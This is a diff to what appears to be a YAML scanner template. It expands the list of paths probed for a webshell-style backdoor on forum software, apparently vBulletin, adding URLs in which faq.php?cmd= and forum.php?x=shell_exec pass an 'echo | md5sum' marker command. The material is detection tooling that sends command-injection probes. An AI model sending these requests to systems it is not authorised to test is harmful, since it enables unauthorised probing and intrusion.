@@ -26,6 +26,14 @@ moves:
       to:
         - '{{BaseURL}}/faq.php?cmd=echo%20-n%20{{num}}|md5sum'
         - '{{BaseURL}}/forum.php?x=shell_exec&y=echo%20-n%20{{num}}|md5sum'
-        - '{{BaseURL}}/{{paths}}/faq.php?cmd=echo%20-n%20{{num}}|md5sum'
-        - '{{BaseURL}}/{{paths}}/forum.php?x=shell_exec&y=echo%20-n%20{{num}}|md5sum'
+        - '{{BaseURL}}/boards/faq.php?cmd=echo%20-n%20{{num}}|md5sum'
+        - '{{BaseURL}}/boards/forum.php?x=shell_exec&y=echo%20-n%20{{num}}|md5sum'
+        - '{{BaseURL}}/board/faq.php?cmd=echo%20-n%20{{num}}|md5sum'
+        - '{{BaseURL}}/board/forum.php?x=shell_exec&y=echo%20-n%20{{num}}|md5sum'
+        - '{{BaseURL}}/forum/faq.php?cmd=echo%20-n%20{{num}}|md5sum'
+        - '{{BaseURL}}/forum/forum.php?x=shell_exec&y=echo%20-n%20{{num}}|md5sum'
+        - '{{BaseURL}}/forums/faq.php?cmd=echo%20-n%20{{num}}|md5sum'
+        - '{{BaseURL}}/forums/forum.php?x=shell_exec&y=echo%20-n%20{{num}}|md5sum'
+        - '{{BaseURL}}/vb/faq.php?cmd=echo%20-n%20{{num}}|md5sum'
+        - '{{BaseURL}}/vb/forum.php?x=shell_exec&y=echo%20-n%20{{num}}|md5sum'
       signs: []
